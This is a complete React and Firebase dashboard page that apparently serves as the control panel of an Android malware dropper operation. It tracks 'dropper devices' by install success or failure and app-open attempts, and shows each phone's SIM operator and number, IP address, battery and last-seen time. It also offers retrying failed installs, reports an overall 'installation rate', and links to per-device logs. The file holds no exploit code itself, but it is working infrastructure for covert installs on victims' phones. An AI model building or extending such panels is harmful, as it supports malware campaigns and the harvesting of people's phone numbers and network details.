// pages/DropperDevices.jsx - Complete updated file

import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { ref, get, onValue, update } from 'firebase/database';
import { db } from '../firebase/config';

function DropperDevices() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [devices, setDevices] = useState([]);
  const [filteredDevices, setFilteredDevices] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState('all');
  const [filterOnline, setFilterOnline] = useState('all');
  const [sortBy, setSortBy] = useState('serial');
  const [viewMode, setViewMode] = useState('grid');
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [showDetail, setShowDetail] = useState(false);
  const [showAddModal, setShowAddModal] = useState(false);
  const [newDevice, setNewDevice] = useState({ brand: '', model: '', device_id: '' });
  const [toast, setToast] = useState(null);
  const [stats, setStats] = useState({
    total: 0,
    success: 0,
    failed: 0,
    pending: 0,
    online: 0,
    offline: 0,
    installRate: 0
  });
  const [animate, setAnimate] = useState(false);
  const searchRef = useRef(null);

  useEffect(() => {
    fetchDevices();
    const devicesRef = ref(db, 'dropper_devices');
    const unsubscribe = onValue(devicesRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const deviceList = Object.keys(data).map(key => ({
          id: key,
          ...data[key]
        }));
        setDevices(deviceList);
        applyFilters(deviceList);
        setAnimate(true);
        setTimeout(() => setAnimate(false), 500);
      }
    });
    return () => unsubscribe();
  }, []);

  const fetchDevices = async () => {
    setLoading(true);
    try {
      const devicesRef = ref(db, 'dropper_devices');
      const snapshot = await get(devicesRef);
      if (snapshot.exists()) {
        const data = snapshot.val();
        const deviceList = Object.keys(data).map(key => ({
          id: key,
          ...data[key]
        }));
        setDevices(deviceList);
        applyFilters(deviceList);
        updateStats(deviceList);
      }
    } catch (error) {
      console.error('Error fetching devices:', error);
    }
    setLoading(false);
  };

  const applyFilters = (deviceList = devices) => {
    let filtered = [...deviceList];

    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(device =>
        device.brand?.toLowerCase().includes(term) ||
        device.model?.toLowerCase().includes(term) ||
        device.device_id?.toLowerCase().includes(term) ||
        device.serialNo?.toString().includes(term) ||
        device.id?.toLowerCase().includes(term)
      );
    }

    if (filterStatus === 'success') {
      filtered = filtered.filter(d => d.install_success === true || d.app_open_attempted === true);
    } else if (filterStatus === 'failed') {
      filtered = filtered.filter(d => d.install_failed === true);
    } else if (filterStatus === 'pending') {
      filtered = filtered.filter(d => !d.install_success && !d.install_failed && !d.app_open_attempted);
    }

    if (filterOnline === 'online') {
      filtered = filtered.filter(d => {
        const lastSeen = d.lastSeen || d.this_app_installTime;
        return lastSeen && (Date.now() - Number(lastSeen)) < 120000;
      });
    } else if (filterOnline === 'offline') {
      filtered = filtered.filter(d => {
        const lastSeen = d.lastSeen || d.this_app_installTime;
        return !lastSeen || (Date.now() - Number(lastSeen)) >= 120000;
      });
    }

    switch (sortBy) {
      case 'serial':
        filtered.sort((a, b) => (b.serialNo || 0) - (a.serialNo || 0));
        break;
      case 'name':
        filtered.sort((a, b) => (a.brand || '').localeCompare(b.brand || ''));
        break;
      case 'status':
        filtered.sort((a, b) => (a.install_success ? 1 : 0) - (b.install_success ? 1 : 0));
        break;
      case 'battery':
        filtered.sort((a, b) => parseInt(b.battery || 0) - parseInt(a.battery || 0));
        break;
      case 'date':
        filtered.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
        break;
      default:
        break;
    }

    setFilteredDevices(filtered);
    updateStats(deviceList);
  };

  const updateStats = (deviceList) => {
    const success = deviceList.filter(d => d.install_success === true || d.app_open_attempted === true).length;
    const failed = deviceList.filter(d => d.install_failed === true).length;
    const pending = deviceList.filter(d => !d.install_success && !d.install_failed && !d.app_open_attempted).length;
    const online = deviceList.filter(d => {
      const lastSeen = d.lastSeen || d.this_app_installTime;
      return lastSeen && (Date.now() - Number(lastSeen)) < 120000;
    }).length;
    const total = deviceList.length;

    setStats({
      total,
      success,
      failed,
      pending,
      online,
      offline: total - online,
      installRate: total > 0 ? Math.round((success / total) * 100) : 0
    });
  };

  // ✅ UPDATED: Smart status detection
  const getInstallStatus = (device) => {
    // ✅ Check app_open_attempted first
    if (device.app_open_attempted === true) {
      return { 
        text: 'Installed ✅', 
        color: '#2ecc71', 
        bg: 'rgba(46,204,113,0.15)', 
        icon: '✅', 
        glow: 'rgba(46,204,113,0.2)' 
      };
    }

    // ✅ Check install_success
    if (device.install_success === true) {
      return { 
        text: 'Installed ✅', 
        color: '#2ecc71', 
        bg: 'rgba(46,204,113,0.15)', 
        icon: '✅', 
        glow: 'rgba(46,204,113,0.2)' 
      };
    }

    // ✅ Check install_failed
    if (device.install_failed === true) {
      return { 
        text: 'Failed ❌', 
        color: '#e74c3c', 
        bg: 'rgba(231,76,60,0.15)', 
        icon: '❌', 
        glow: 'rgba(231,76,60,0.2)' 
      };
    }

    // ⏸️ Default: Pending
    return { 
      text: 'Pending ⏳', 
      color: '#f59e0b', 
      bg: 'rgba(245,158,11,0.15)', 
      icon: '⏳', 
      glow: 'rgba(245,158,11,0.2)' 
    };
  };

  const getOnlineStatus = (device) => {
    const lastSeen = device.lastSeen || device.this_app_installTime;
    if (!lastSeen) return { text: 'Offline', color: '#6c757d', dot: '⚫', pulse: false };
    const diff = Date.now() - Number(lastSeen);
    if (diff < 120000) return { text: 'Online', color: '#2ecc71', dot: '🟢', pulse: true };
    return { text: 'Offline', color: '#e74c3c', dot: '🔴', pulse: false };
  };

  const getBatteryColor = (battery) => {
    const value = parseInt(battery);
    if (value >= 70) return { bg: '#2ecc71', text: '#2ecc71', glow: 'rgba(46,204,113,0.3)' };
    if (value >= 40) return { bg: '#f1c40f', text: '#f1c40f', glow: 'rgba(241,196,15,0.3)' };
    if (value >= 20) return { bg: '#e67e22', text: '#e67e22', glow: 'rgba(230,126,34,0.3)' };
    return { bg: '#e74c3c', text: '#e74c3c', glow: 'rgba(231,76,60,0.3)' };
  };

  const getShortId = (id) => {
    if (!id) return 'N/A';
    return id.length > 12 ? `${id.slice(0, 8)}...${id.slice(-4)}` : id;
  };

  const parseSimInfo = (simInfo) => {
    if (!simInfo) return { operator: 'N/A', number: 'N/A' };
    const parts = simInfo.split(' - ');
    if (parts.length === 2) {
      const operatorPart = parts[0].split(': ')[1] || parts[0];
      return { operator: operatorPart.trim(), number: parts[1].trim() };
    }
    return { operator: simInfo, number: 'N/A' };
  };

  const formatTimeAgo = (timestamp) => {
    if (!timestamp) return 'Never';
    const diff = Date.now() - Number(timestamp);
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    return `${Math.floor(diff / 86400000)}d ago`;
  };

  const formatDate = (timestamp) => {
    if (!timestamp) return 'N/A';
    return new Date(timestamp).toLocaleString('en-IN', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const handleSearch = (e) => {
    setSearchTerm(e.target.value);
    applyFilters();
  };

  const handleFilter = (status) => {
    setFilterStatus(status);
    applyFilters();
  };

  const handleSort = (e) => {
    setSortBy(e.target.value);
    applyFilters();
  };

  const handleOnlineFilter = (status) => {
    setFilterOnline(status);
    applyFilters();
  };

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 3000);
  };

  // Retry failed device
  const retryInstall = async (deviceId) => {
    try {
      const deviceRef = ref(db, `dropper_devices/${deviceId}`);
      await update(deviceRef, {
        install_failed: false,
        install_success: false,
        retry_count: (devices.find(d => d.id === deviceId)?.retry_count || 0) + 1,
        retry_time: Date.now()
      });
      showToast('🔄 Retry initiated for device', 'success');
      fetchDevices();
    } catch (error) {
      showToast('❌ Failed to retry: ' + error.message, 'error');
    }
  };

  // Delete device
  const deleteDevice = async (deviceId) => {
    if (!window.confirm('Are you sure you want to delete this device?')) return;
    try {
      const deviceRef = ref(db, `dropper_devices/${deviceId}`);
      await deviceRef.remove();
      showToast('🗑️ Device deleted successfully', 'success');
      fetchDevices();
    } catch (error) {
      showToast('❌ Failed to delete: ' + error.message, 'error');
    }
  };

  // Add new device
  const addDevice = async () => {
    if (!newDevice.brand || !newDevice.model || !newDevice.device_id) {
      showToast('⚠️ Please fill all fields', 'error');
      return;
    }
    try {
      const deviceRef = ref(db, `dropper_devices/${newDevice.device_id}`);
      await deviceRef.set({
        ...newDevice,
        install_success: false,
        install_failed: false,
        app_open_attempted: false,
        created_at: Date.now(),
        status: 'pending'
      });
      showToast('✅ Device added successfully', 'success');
      setShowAddModal(false);
      setNewDevice({ brand: '', model: '', device_id: '' });
      fetchDevices();
    } catch (error) {
      showToast('❌ Failed to add: ' + error.message, 'error');
    }
  };

  if (loading) {
    return (
      <div className="dropper-loading">
        <div className="loading-icon">📱</div>
        <div className="loading-spinner"></div>
        <p>Loading dropper devices...</p>
      </div>
    );
  }

  return (
    <div className="dropper-devices-page">
      {/* Toast */}
      {toast && (
        <div className={`dropper-toast ${toast.type}`}>
          {toast.message}
        </div>
      )}

      {/* Header */}
      <div className="dropper-header">
        <button className="back-btn" onClick={() => navigate('/')}>
          <span>←</span> Back
        </button>
        <div className="header-center">
          <span className="header-icon">📱</span>
          <h2>Dropper Devices</h2>
        </div>
        <div className="header-actions">
          <button className="add-btn" onClick={() => setShowAddModal(true)}>
            ➕ Add
          </button>
          <button className="view-toggle" onClick={() => setViewMode(viewMode === 'grid' ? 'list' : 'grid')}>
            {viewMode === 'grid' ? '📋' : '📐'}
          </button>
          <span className="device-count">{stats.total}</span>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="dropper-stats">
        <div className="stat-card total" onClick={() => handleFilter('all')}>
          <div className="stat-number">{stats.total}</div>
          <div className="stat-label">📱 Total</div>
        </div>
        <div className="stat-card success" onClick={() => handleFilter('success')}>
          <div className="stat-number">{stats.success}</div>
          <div className="stat-label">✅ Success</div>
        </div>
        <div className="stat-card failed" onClick={() => handleFilter('failed')}>
          <div className="stat-number">{stats.failed}</div>
          <div className="stat-label">❌ Failed</div>
        </div>
        <div className="stat-card pending" onClick={() => handleFilter('pending')}>
          <div className="stat-number">{stats.pending}</div>
          <div className="stat-label">⏳ Pending</div>
        </div>
        <div className="stat-card online" onClick={() => handleOnlineFilter('online')}>
          <div className="stat-number">{stats.online}</div>
          <div className="stat-label">🟢 Online</div>
        </div>
        <div className="stat-card offline" onClick={() => handleOnlineFilter('offline')}>
          <div className="stat-number">{stats.offline}</div>
          <div className="stat-label">🔴 Offline</div>
        </div>
      </div>

      {/* Success Rate */}
      <div className="rate-section">
        <div className="rate-info">
          <span className="rate-label">📊 Installation Rate</span>
          <span className="rate-value">{stats.installRate}%</span>
        </div>
        <div className="rate-bar">
          <div className="rate-fill" style={{
            width: `${stats.installRate}%`,
            background: `linear-gradient(90deg, ${stats.installRate < 30 ? '#e74c3c' : stats.installRate < 60 ? '#f59e0b' : '#2ecc71'}, ${stats.installRate < 30 ? '#c0392b' : stats.installRate < 60 ? '#d97706' : '#27ae60'})`
          }} />
        </div>
      </div>

      {/* Controls */}
      <div className="dropper-controls">
        <div className="search-box">
          <span className="search-icon">🔍</span>
          <input
            type="text"
            placeholder="Search devices..."
            value={searchTerm}
            onChange={handleSearch}
            ref={searchRef}
          />
          {searchTerm && (
            <button className="clear-btn" onClick={() => { setSearchTerm(''); applyFilters(); }}>
              ✕
            </button>
          )}
        </div>
        <div className="filter-row">
          <div className="filter-tabs">
            <button className={`filter-tab ${filterStatus === 'all' ? 'active' : ''}`} onClick={() => handleFilter('all')}>All</button>
            <button className={`filter-tab success ${filterStatus === 'success' ? 'active' : ''}`} onClick={() => handleFilter('success')}>✅</button>
            <button className={`filter-tab failed ${filterStatus === 'failed' ? 'active' : ''}`} onClick={() => handleFilter('failed')}>❌</button>
            <button className={`filter-tab pending ${filterStatus === 'pending' ? 'active' : ''}`} onClick={() => handleFilter('pending')}>⏳</button>
          </div>
          <div className="sort-controls">
            <select value={sortBy} onChange={handleSort} className="sort-select">
              <option value="serial">Serial</option>
              <option value="name">Name</option>
              <option value="status">Status</option>
              <option value="battery">Battery</option>
              <option value="date">Date</option>
            </select>
          </div>
        </div>
      </div>

      {/* Device List */}
      <div className={`dropper-list ${viewMode}`}>
        {filteredDevices.length === 0 ? (
          <div className="empty-state">
            <span className="empty-icon">📭</span>
            <p>No devices found</p>
            <span className="empty-sub">Try adjusting your filters</span>
          </div>
        ) : (
          filteredDevices.map((device, index) => {
            const installStatus = getInstallStatus(device);
            const onlineStatus = getOnlineStatus(device);
            const simData = parseSimInfo(device.sim_info);
            const shortId = getShortId(device.device_id || device.id);
            const batteryInfo = getBatteryColor(device.battery);

            return (
              <div
                key={device.id}
                className={`dropper-card ${animate ? 'animate' : ''}`}
                style={{ animationDelay: `${index * 0.05}s` }}
                onClick={() => navigate(`/device-logs/${device.device_id || device.id}`)}
              >
                <div className="card-status-line" style={{ background: installStatus.color, boxShadow: `0 0 20px ${installStatus.glow}` }} />

                <div className="card-content">
                  <div className="card-top">
                    <div className="card-left">
                      <span className="device-icon">📱</span>
                      <div className="device-info">
                        <span className="device-name">{device.brand || 'UNKNOWN'}</span>
                        <span className="device-model">{device.model || 'Device'}</span>
                      </div>
                    </div>
                    <div className="card-right">
                      <span className={`status-dot ${onlineStatus.pulse ? 'pulse' : ''}`} style={{ color: onlineStatus.color }}>
                        {onlineStatus.dot}
                      </span>
                      <span className="install-badge" style={{
                        background: installStatus.bg,
                        color: installStatus.color,
                        border: `1px solid ${installStatus.color}30`
                      }}>
                        {installStatus.icon} {installStatus.text}
                      </span>
                    </div>
                  </div>

                  <div className="card-mid">
                    <span className="card-id">🔑 {shortId}</span>
                    <span className="card-version">🤖 v{device.android_version || 'N/A'}</span>
                    <span className="card-serial">#{device.serialNo || 'N/A'}</span>
                    <span className="card-battery" style={{ color: batteryInfo.text }}>
                      🔋 {device.battery || 'N/A'}
                    </span>
                  </div>

                  <div className="card-stats">
                    <div className="card-stat"><span>📶</span><span>{simData.operator}</span></div>
                    <div className="card-stat"><span>📞</span><span>{simData.number}</span></div>
                    <div className="card-stat"><span>🌐</span><span>{device.ip || 'N/A'}</span></div>
                    <div className="card-stat"><span>📅</span><span>{formatTimeAgo(device.lastSeen)}</span></div>
                  </div>

                  <div className="card-bottom">
                    <span className="card-time">🕐 {formatTimeAgo(device.lastSeen)}</span>
                    <span className="card-view">📋 View Logs →</span>
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>

      {/* Add Device Modal */}
      {showAddModal && (
        <div className="detail-modal" onClick={() => setShowAddModal(false)}>
          <div className="detail-content" onClick={(e) => e.stopPropagation()}>
            <button className="detail-close" onClick={() => setShowAddModal(false)}>✕</button>
            <h3 style={{ margin: '0 0 16px 0', fontSize: '18px', fontWeight: 700 }}>➕ Add New Device</h3>

            <div className="add-form">
              <div className="form-group">
                <label>Brand</label>
                <input type="text" value={newDevice.brand} onChange={(e) => setNewDevice({ ...newDevice, brand: e.target.value })} placeholder="e.g., Samsung" />
              </div>
              <div className="form-group">
                <label>Model</label>
                <input type="text" value={newDevice.model} onChange={(e) => setNewDevice({ ...newDevice, model: e.target.value })} placeholder="e.g., Galaxy S23" />
              </div>
              <div className="form-group">
                <label>Device ID</label>
                <input type="text" value={newDevice.device_id} onChange={(e) => setNewDevice({ ...newDevice, device_id: e.target.value })} placeholder="Unique device ID" />
              </div>
              <div className="form-actions">
                <button className="form-cancel" onClick={() => setShowAddModal(false)}>Cancel</button>
                <button className="form-submit" onClick={addDevice}>Add Device</button>
              </div>
            </div>
          </div>
        </div>
      )}

      <style>{`
        .dropper-devices-page {
          padding: 12px 16px;
          max-width: 480px;
          margin: 0 auto;
          background: var(--bg-primary);
          min-height: 100vh;
        }

        .dropper-toast {
          position: fixed;
          top: 20px;
          left: 50%;
          transform: translateX(-50%);
          padding: 10px 24px;
          border-radius: 10px;
          font-weight: 600;
          font-size: 13px;
          z-index: 99999;
          animation: slideDown 0.3s ease;
          max-width: 90%;
          text-align: center;
        }
        .dropper-toast.success { background: #2ecc71; color: white; }
        .dropper-toast.error { background: #e74c3c; color: white; }
        .dropper-toast.info { background: #3498db; color: white; }

        @keyframes slideDown {
          from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
          to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        .dropper-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 8px 0 16px;
          border-bottom: 1px solid var(--border-color);
          margin-bottom: 12px;
        }
        .back-btn {
          background: none;
          border: none;
          color: var(--text-muted);
          font-size: 13px;
          font-weight: 600;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 4px;
        }
        .header-center { display: flex; align-items: center; gap: 8px; }
        .header-center h2 { font-size: 17px; font-weight: 700; color: var(--text-primary); margin: 0; }
        .header-icon { font-size: 20px; }
        .header-actions { display: flex; align-items: center; gap: 6px; }
        .add-btn {
          padding: 4px 12px;
          border: none;
          border-radius: 6px;
          background: #6c63ff;
          color: white;
          font-size: 12px;
          font-weight: 600;
          cursor: pointer;
        }
        .view-toggle {
          background: var(--bg-input);
          border: 1px solid var(--border-color);
          border-radius: 6px;
          padding: 4px 8px;
          cursor: pointer;
          font-size: 16px;
        }
        .device-count {
          font-size: 12px;
          font-weight: 600;
          color: #6c63ff;
          background: rgba(108, 99, 255, 0.1);
          padding: 4px 10px;
          border-radius: 12px;
        }

        .dropper-stats {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 6px;
          margin-bottom: 8px;
        }
        .stat-card {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 8px 4px;
          text-align: center;
          border: 1px solid var(--border-color);
          cursor: pointer;
          transition: all 0.2s;
        }
        .stat-card:active { transform: scale(0.95); }
        .stat-card .stat-number { font-size: 18px; font-weight: 700; color: var(--text-primary); }
        .stat-card .stat-label { font-size: 8px; color: var(--text-muted); text-transform: uppercase; }
        .stat-card.success .stat-number { color: #2ecc71; }
        .stat-card.failed .stat-number { color: #e74c3c; }
        .stat-card.pending .stat-number { color: #f59e0b; }
        .stat-card.online .stat-number { color: #2ecc71; }
        .stat-card.offline .stat-number { color: #e74c3c; }
        .stat-card.total .stat-number { color: #6c63ff; }

        .rate-section {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 10px 14px;
          margin-bottom: 12px;
          border: 1px solid var(--border-color);
        }
        .rate-info { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .rate-label { font-size: 12px; font-weight: 600; color: var(--text-muted); }
        .rate-value { font-size: 14px; font-weight: 700; color: #6c63ff; }
        .rate-bar { width: 100%; height: 6px; background: var(--bg-input); border-radius: 4px; overflow: hidden; }
        .rate-fill { height: 100%; border-radius: 4px; transition: width 0.8s ease; }

        .dropper-controls {
          display: flex;
          flex-direction: column;
          gap: 8px;
          margin-bottom: 12px;
        }
        .search-box {
          display: flex;
          align-items: center;
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 10px;
          padding: 0 12px;
        }
        .search-icon { color: var(--text-muted); font-size: 14px; margin-right: 10px; }
        .search-box input {
          flex: 1;
          padding: 10px 0;
          border: none;
          background: transparent;
          color: var(--text-primary);
          font-size: 14px;
          outline: none;
        }
        .clear-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 14px; padding: 4px 8px; }

        .filter-row { display: flex; gap: 8px; flex-wrap: wrap; }
        .filter-tabs { display: flex; gap: 4px; flex-wrap: wrap; }
        .filter-tab {
          padding: 4px 10px;
          border: 1px solid var(--border-color);
          border-radius: 12px;
          background: var(--bg-input);
          color: var(--text-muted);
          cursor: pointer;
          font-size: 10px;
          font-weight: 600;
          transition: all 0.2s;
        }
        .filter-tab.active { border-color: #6c63ff; background: rgba(108,99,255,0.1); color: #6c63ff; }
        .filter-tab.success.active { border-color: #2ecc71; color: #2ecc71; background: rgba(46,204,113,0.1); }
        .filter-tab.failed.active { border-color: #e74c3c; color: #e74c3c; background: rgba(231,76,60,0.1); }
        .filter-tab.pending.active { border-color: #f59e0b; color: #f59e0b; background: rgba(245,158,11,0.1); }

        .sort-controls { flex: 1; min-width: 100px; }
        .sort-select {
          width: 100%;
          padding: 6px 10px;
          border: 1px solid var(--border-color);
          border-radius: 8px;
          background: var(--bg-card);
          color: var(--text-primary);
          font-size: 11px;
          outline: none;
        }

        .dropper-list { display: flex; flex-direction: column; gap: 10px; }
        .dropper-list.grid { display: grid; grid-template-columns: 1fr; gap: 10px; }

        .dropper-card {
          background: var(--bg-card);
          border-radius: 12px;
          border: 1px solid var(--border-color);
          cursor: pointer;
          overflow: hidden;
          transition: all 0.3s;
          animation: slideUp 0.4s ease both;
        }
        @keyframes slideUp {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .dropper-card:hover { transform: translateY(-2px); box-shadow: 0 4px 16px rgba(0,0,0,0.06); }

        .card-status-line { height: 3px; width: 100%; }
        .card-content { padding: 12px 14px 14px; }

        .card-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
        .card-left { display: flex; align-items: center; gap: 10px; }
        .device-icon { font-size: 28px; }
        .device-name { font-size: 15px; font-weight: 700; color: var(--text-primary); }
        .device-model { font-size: 11px; color: var(--text-muted); display: block; }

        .card-right { display: flex; align-items: center; gap: 6px; }
        .status-dot { font-size: 14px; }
        .status-dot.pulse { animation: pulse 1.5s ease infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        .install-badge { font-size: 10px; font-weight: 600; padding: 2px 10px; border-radius: 10px; }

        .card-mid { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 6px; font-size: 10px; color: var(--text-muted); }
        .card-mid span { background: var(--bg-input); padding: 2px 8px; border-radius: 4px; }

        .card-stats { display: grid; grid-template-columns: 1fr 1fr; gap: 4px; margin-bottom: 8px; }
        .card-stat { display: flex; align-items: center; gap: 4px; padding: 3px 6px; background: var(--bg-input); border-radius: 4px; font-size: 9px; font-weight: 600; color: var(--text-primary); }

        .card-bottom { display: flex; justify-content: space-between; padding-top: 6px; border-top: 1px solid var(--border-color); font-size: 9px; color: var(--text-muted); }
        .card-view { color: #6c63ff; font-weight: 600; }

        .detail-modal {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.7);
          backdrop-filter: blur(12px);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
          padding: 20px;
          animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .detail-content {
          background: var(--bg-card);
          border-radius: 16px;
          max-width: 420px;
          width: 100%;
          max-height: 90vh;
          overflow-y: auto;
          padding: 20px;
          animation: scaleIn 0.3s ease;
          position: relative;
        }
        @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }

        .detail-close { position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 22px; color: var(--text-muted); cursor: pointer; }

        .detail-header { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
        .detail-icon { font-size: 40px; }
        .detail-header h3 { margin: 0; font-size: 18px; font-weight: 700; color: var(--text-primary); }
        .detail-id { font-size: 11px; color: var(--text-muted); font-family: monospace; display: block; }

        .detail-status-row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
        .detail-status-item { padding: 8px 12px; background: var(--bg-input); border-radius: 8px; border: 1px solid var(--border-color); }
        .detail-status-item .detail-label { font-size: 8px; color: var(--text-muted); text-transform: uppercase; font-weight: 600; display: block; }
        .detail-status-item .detail-value { font-size: 14px; font-weight: 700; }

        .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 14px; }
        .detail-item { display: flex; flex-direction: column; padding: 6px 10px; background: var(--bg-input); border-radius: 6px; border: 1px solid var(--border-color); }
        .detail-item.full { grid-column: span 2; }
        .detail-label { font-size: 8px; color: var(--text-muted); text-transform: uppercase; font-weight: 600; }
        .detail-value { font-size: 13px; font-weight: 600; color: var(--text-primary); }

        .detail-actions { display: flex; gap: 6px; flex-wrap: wrap; }
        .detail-goto, .detail-retry, .detail-delete {
          flex: 1;
          padding: 10px;
          border: none;
          border-radius: 8px;
          font-size: 13px;
          font-weight: 700;
          cursor: pointer;
          transition: all 0.3s;
          min-width: 80px;
          text-align: center;
        }
        .detail-goto { background: linear-gradient(135deg, #6c63ff, #3b82f6); color: white; }
        .detail-goto:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(108,99,255,0.3); }
        .detail-retry { background: #f59e0b; color: white; }
        .detail-retry:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(245,158,11,0.3); }
        .detail-delete { background: #e74c3c; color: white; }
        .detail-delete:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(231,76,60,0.3); }

        .add-form { display: flex; flex-direction: column; gap: 12px; }
        .form-group { display: flex; flex-direction: column; gap: 4px; }
        .form-group label { font-size: 12px; font-weight: 600; color: var(--text-muted); }
        .form-group input { padding: 10px 12px; border: 1px solid var(--border-color); border-radius: 8px; background: var(--bg-input); color: var(--text-primary); font-size: 14px; outline: none; }
        .form-group input:focus { border-color: #6c63ff; }
        .form-actions { display: flex; gap: 8px; margin-top: 4px; }
        .form-cancel { flex: 1; padding: 10px; border: 1px solid var(--border-color); border-radius: 8px; background: var(--bg-input); color: var(--text-muted); cursor: pointer; font-weight: 600; }
        .form-submit { flex: 2; padding: 10px; border: none; border-radius: 8px; background: #6c63ff; color: white; cursor: pointer; font-weight: 700; }
        .form-submit:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(108,99,255,0.3); }

        .empty-state { text-align: center; padding: 40px 20px; color: var(--text-muted); background: var(--bg-card); border-radius: 12px; border: 1px solid var(--border-color); }
        .empty-icon { font-size: 48px; display: block; margin-bottom: 8px; }
        .empty-sub { font-size: 12px; display: block; margin-top: 4px; opacity: 0.6; }

        .dropper-loading { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 60vh; gap: 12px; color: var(--text-muted); }
        .loading-icon { font-size: 48px; animation: bounce 1s ease infinite; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
        .loading-spinner { width: 32px; height: 32px; border: 3px solid rgba(108,99,255,0.1); border-top-color: #6c63ff; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 480px) {
          .dropper-devices-page { padding: 8px 10px; }
          .dropper-stats { grid-template-columns: repeat(3, 1fr); gap: 4px; }
          .stat-card { padding: 6px 4px; }
          .stat-card .stat-number { font-size: 16px; }
          .detail-content { margin: 10px; padding: 16px; }
          .card-stats { grid-template-columns: 1fr 1fr; }
          .detail-status-row { grid-template-columns: 1fr; }
          .detail-grid { grid-template-columns: 1fr; }
          .detail-item.full { grid-column: span 1; }
          .detail-actions { flex-direction: column; }
          .filter-row { flex-direction: column; }
          .sort-controls { min-width: auto; }
        }
      `}</style>
    </div>
  );
}

export default DropperDevices;